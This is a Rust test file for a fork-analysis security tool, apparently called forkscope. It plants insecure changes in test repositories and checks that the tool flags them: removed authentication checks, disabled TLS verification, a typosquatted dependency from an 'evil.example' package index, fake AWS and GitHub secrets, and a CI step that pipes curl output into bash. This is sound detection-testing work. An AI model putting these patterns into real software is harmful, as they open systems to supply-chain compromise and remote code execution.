//! Security-oriented analysis: authentication, TLS, dependencies, secrets.

mod common;
use common::*;
use forkscope::analysis::dependencies::DepChangeKind;
use forkscope::analysis::rules::{Category, Severity};

/// Scenario 10: change to an authentication mechanism.
#[test]
fn authentication_change_is_flagged() {
    let tmp = tempfile::tempdir().unwrap();
    let up = make_upstream(tmp.path());
    let client = clone_at(&up, tmp.path(), "client", "v1.2");
    write(
        &client,
        "src/auth.py",
        &AUTH_PY.replace(
            "    if not check_password(user, password):\n        raise PermissionDenied()\n",
            "",
        ),
    );
    let c = commit(&client, "Client", "fix typo");
    let r = analyze(&client, &up, &tmp.path().join("out"));
    let f = r
        .security
        .findings
        .iter()
        .find(|f| f.rule_id == "AUTH-001")
        .expect("removal of check_password expected");
    assert_eq!(f.category, Category::Authentication);
    assert_eq!(f.severity, Severity::High);
    assert_eq!(f.file, "src/auth.py");
    assert_eq!(f.old_line, Some(5));
    assert_eq!(f.change, "removed");
    assert!(f.old_code.as_deref().unwrap().contains("check_password"));
    assert_eq!(f.commits, vec![c.clone()]);
    // The commit is suspicious despite its innocuous message.
    let ci = r
        .history
        .as_ref()
        .unwrap()
        .client_commits
        .iter()
        .find(|x| x.hash == c)
        .unwrap();
    assert_eq!(ci.max_severity, Some(Severity::High));
    assert!(ci
        .suspicious
        .iter()
        .any(|s| s.detail.contains("innocuous commit message")));
}

/// An access control replaced by a less restrictive condition.
#[test]
fn weakened_access_control() {
    let tmp = tempfile::tempdir().unwrap();
    let up = make_upstream(tmp.path());
    let client = tmp.path().join("client");
    export_tree(&up.dir, "v1.2", &client);
    write(
        &client,
        "src/views.py",
        &VIEWS_PY.replace(
            "if not request.user.is_admin:",
            "if not (request.user.is_admin or request.user.is_authenticated):",
        ),
    );
    let r = analyze(&client, &up, &tmp.path().join("out"));
    let f = r
        .security
        .findings
        .iter()
        .find(|f| f.rule_id == "AUTHZ-001")
        .expect("modified check");
    assert_eq!(f.change, "modified");
    assert!(f.new_code.as_deref().unwrap().contains("is_authenticated"));
}

/// Scenario 11: removal of a TLS validation.
#[test]
fn tls_validation_removed() {
    let tmp = tempfile::tempdir().unwrap();
    let up = make_upstream(tmp.path());
    let client = tmp.path().join("client");
    export_tree(&up.dir, "v1.2", &client);
    write(
        &client,
        "src/net.py",
        &std::fs::read_to_string(client.join("src/net.py"))
            .unwrap()
            .replace("timeout=10)", "timeout=10, verify=False)"),
    );
    write(
        &client,
        "src/tls.js",
        "const agent = new https.Agent({ rejectUnauthorized: false });\n",
    );
    let r = analyze(&client, &up, &tmp.path().join("out"));
    let tls: Vec<_> = r
        .security
        .findings
        .iter()
        .filter(|f| f.rule_id == "CRYPTO-001")
        .collect();
    assert_eq!(tls.len(), 2, "{tls:#?}");
    assert!(tls.iter().all(|f| f.severity == Severity::Critical));
    let py = tls.iter().find(|f| f.file == "src/net.py").unwrap();
    assert_eq!(py.line, Some(7));
    assert!(py.old_code.as_deref().unwrap().contains("timeout=10)"));
    assert!(r.security.counts[&Severity::Critical] >= 2);
}

/// Scenario 12: dependencies added (registry, Git, alternative source).
#[test]
fn dependency_added() {
    let tmp = tempfile::tempdir().unwrap();
    let up = make_upstream(tmp.path());
    let client = clone_at(&up, tmp.path(), "client", "v1.2");
    write(
        &client,
        "requirements.txt",
        "requests==2.32.0\nflask==2.3.0\nreqeusts==1.0\n--extra-index-url https://pypi.evil.example/simple\n",
    );
    write(&client, "package.json", "{\n  \"name\": \"demo\",\n  \"dependencies\": {\n    \"express\": \"^4.18.0\",\n    \"helper\": \"git+https://git.example.org/helper.git#main\"\n  },\n  \"scripts\": { \"postinstall\": \"node setup.js\" }\n}\n");
    commit(&client, "Client", "deps");
    let r = analyze(&client, &up, &tmp.path().join("out"));
    let d = &r.dependencies;
    let req = d.manifests.iter().find(|m| m.path == "requirements.txt").unwrap();
    assert!(req
        .changes
        .iter()
        .any(|c| c.name == "reqeusts" && c.kind == DepChangeKind::Added));
    assert!(req.changes.iter().any(|c| c.name == "requests"
        && c.kind == DepChangeKind::VersionChanged
        && c.old_version.as_deref() == Some("==2.31.0")
        && c.new_version.as_deref() == Some("==2.32.0")));
    assert!(req.changes.iter().any(|c| c.scope == "pip-option" && c.external));
    let pkg = d.manifests.iter().find(|m| m.path == "package.json").unwrap();
    assert!(pkg.changes.iter().any(|c| c.name == "helper" && c.external));
    assert!(d.external >= 2);
    let titles: Vec<&str> = r
        .security
        .findings
        .iter()
        .filter(|f| f.category == Category::Dependencies)
        .map(|f| f.title.as_str())
        .collect();
    assert!(
        titles.contains(&"External dependency (Git/URL/path) added"),
        "{titles:?}"
    );
    assert!(titles.contains(&"Package source added/modified"));
    assert!(titles.contains(&"Lifecycle script added/modified"));
    assert!(titles.contains(&"Dependency added"));
}

/// Scenario 13: secret added to the code, never written in clear text.
#[test]
fn secret_added_and_masked() {
    let tmp = tempfile::tempdir().unwrap();
    let up = make_upstream(tmp.path());
    let client = clone_at(&up, tmp.path(), "client", "v1.2");
    // Fake secrets assembled at runtime so that they never appear verbatim in the repository.
    let aws = &format!("{}{}", "AKIA", "Z7Q3EXAMPLEK3Y42");
    let gh = &format!("{}{}", "ghp_", "R4nd0mT0k3nV4lu3F0rT3st1ngPurp0s3s12");
    write(
        &client,
        "src/settings.py",
        &format!("AWS_ACCESS_KEY_ID = '{aws}'\nDB_PASSWORD = 'S3cr3t-Pa55w0rd!'\nTIMEOUT = 3\n"),
    );
    write(&client, "tests/fixtures.js", &format!("const token = \"{gh}\";\n"));
    write(&client, ".env.example", "API_KEY=changeme\n");
    commit(&client, "Client", "config");
    let out = tmp.path().join("out");
    let r = analyze_with(&client, &up, &out, |o| o.full_diff = true);
    let aws_f = r
        .secrets
        .iter()
        .find(|s| s.detector == "aws-access-key")
        .expect("AWS key");
    assert_eq!(aws_f.file, "src/settings.py");
    assert_eq!(aws_f.line, Some(1));
    assert!(aws_f.masked_value.starts_with("AKIA") && !aws_f.masked_value.contains("K3Y42"));
    assert!(r
        .secrets
        .iter()
        .any(|s| s.detector == "password-assignment" && s.line == Some(2)));
    let t = r
        .secrets
        .iter()
        .find(|s| s.detector == "github-token")
        .expect("token in a test file");
    assert!(t.in_test_or_example, "test file reported, not ignored");
    // No clear-text value in the written reports.
    for f in [
        "forkscope-report.md",
        "forkscope-report.json",
        "diffs/src/settings.py.diff",
        "diffs/tests/fixtures.js.diff",
    ] {
        let txt = std::fs::read_to_string(out.join(f)).unwrap();
        assert!(!txt.contains(aws), "{f} contains the AWS key in clear text");
        assert!(!txt.contains(gh), "{f} contains the GitHub token in clear text");
        assert!(
            !txt.contains("S3cr3t-Pa55w0rd!"),
            "{f} contains the password in clear text"
        );
    }
}

/// Limit: a check that is merely moved is not reported as removed.
#[test]
fn moved_check_is_not_reported() {
    let tmp = tempfile::tempdir().unwrap();
    let up = make_upstream(tmp.path());
    let client = tmp.path().join("client");
    export_tree(&up.dir, "v1.2", &client);
    // Move delete_item after show (check kept unchanged).
    write(&client, "src/views.py", "def show(request, item):\n    return render(item)\n\n\ndef delete_item(request, item):\n    if not request.user.is_admin:\n        return forbidden()\n    item.delete()\n    return ok()\n");
    let r = analyze(&client, &up, &tmp.path().join("out"));
    assert!(
        !r.security.findings.iter().any(|f| f.rule_id == "AUTHZ-001"),
        "{:#?}",
        r.security.findings
    );
}

/// Change to a CI/CD workflow and Docker permissions.
#[test]
fn ci_and_docker_changes() {
    let tmp = tempfile::tempdir().unwrap();
    let up = make_upstream(tmp.path());
    let client = tmp.path().join("client");
    export_tree(&up.dir, "v1.2", &client);
    write(
        &client,
        ".github/workflows/ci.yml",
        "on: pull_request_target\njobs:\n  b:\n    steps:\n      - run: curl https://x.sh | bash\n",
    );
    write(
        &client,
        "docker-compose.yml",
        "services:\n  app:\n    privileged: true\n",
    );
    let r = analyze(&client, &up, &tmp.path().join("out"));
    let ids: Vec<&str> = r.security.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"CONF-006"), "{ids:?}");
    assert!(ids.contains(&"CONF-007"));
    assert!(ids.contains(&"CONF-004"));
}
